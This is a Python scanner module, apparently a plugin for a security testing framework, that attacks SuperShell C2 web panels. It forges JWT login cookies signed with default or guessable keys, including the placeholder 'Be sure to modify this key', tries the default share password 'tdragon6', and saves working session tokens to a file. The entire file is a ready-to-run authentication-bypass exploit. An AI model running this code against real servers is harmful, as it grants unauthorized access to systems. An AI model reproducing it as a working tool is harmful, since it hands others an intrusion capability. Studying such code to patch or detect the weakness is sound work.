
import time

import jwt,requests
import urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc,OutPrintInfoErr
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
import re
urllib3.disable_warnings()

class SuperShellJwt_Scan():
    def get_jwt_token(self,username, salt, exp_time):
        '''
            获取jwt token
        '''
        exp = int(time.time() + exp_time)
        data = {
            "username": username,
            "exp": exp
        }
        token = jwt.encode(payload=data, key=salt, algorithm='HS256')
        return token

    def login(self,url, token):
        c = {"token": token}
        try:
            resp = requests.get(url + "/supershell/client", cookies=c,verify=self.ssl,proxies=self.proxy, timeout=self.timeout,headers=self.headers, allow_redirects=False)
            return (resp and "备忘录" in resp.text)
        except Exception:
            if not self.batch:
                OutPrintInfo("SuperShell", f"目标请求出错")
                return None
    def burp(self,url):
        try:
            username = None
            baseurl = url + "/supershell/log/.js"
            req = requests.get(url=baseurl,proxies=self.proxy,verify=self.ssl,timeout=self.timeout)
            if "Hacker" not in req.text:
                username = "admin"
            pattern = r'<div class="d-none d-xl-block ps-2">\s*<div>(.*?)<\/div>'
            match = re.search(pattern, req.text, re.DOTALL)
            if match:
                username = match.group(1).strip()

            for salt in ["Be sure to modify this key",username,"admin"]:
                username = username
                token = self.get_jwt_token(username, salt, 999999)

                if self.login(url, token):
                    OutPrintInfoSuc("SuperShell", f"{url}/supershell/client [SALT] {salt} [COOKIE] token={token}")
                    if self.batch:
                        OutPutFile("supershell_jwt.txt",f"{url}/supershell/client [SALT] {salt} [COOKIE] token={token}")
                else:
                    return False
        except Exception:
            pass

    def burp_share(self,url):
        password = "tdragon6"
        jsonstr = {"share_password":password}
        header = {"User-Agent": self.headers['User-Agent'], "Content-Type": "application/json"}
        try:
            resp = requests.post(url + "/supershell/share/shell/login/auth",headers=header,json=jsonstr, timeout=self.timeout,proxies=self.proxy,verify=self.ssl)
            if resp and "Set-Cookie" in resp.headers:
                token = resp.headers["Set-Cookie"].replace("share_token=","")
                if "Path=" in token:
                    token = token.replace("; Path=/","")
                if self.login(url, token):
                    OutPrintInfoSuc("SuperShell", f"{url}/supershell/client [SHARE] {password} [COOKIE] {token}")
                    if self.batch:
                        OutPutFile("supershell_jwt.txt",f"{url}/supershell/client [SHARE] {password} [COOKIE] {token}")
        except Exception:
            pass
    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.ssl = target["ssl"]
        headers = target["header"]
        proxy = target["proxy"]

        self.timeout = int(target["timeout"])
        self.headers, self.proxy = ReqSet(header=headers, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("SuperShell", f"开始检测SuperShell JWT漏洞...")
        self.burp(url)
        self.burp_share(url)
        if not self.batch:
            OutPrintInfo("SuperShell", f"SuperShell JWT漏洞检测结束")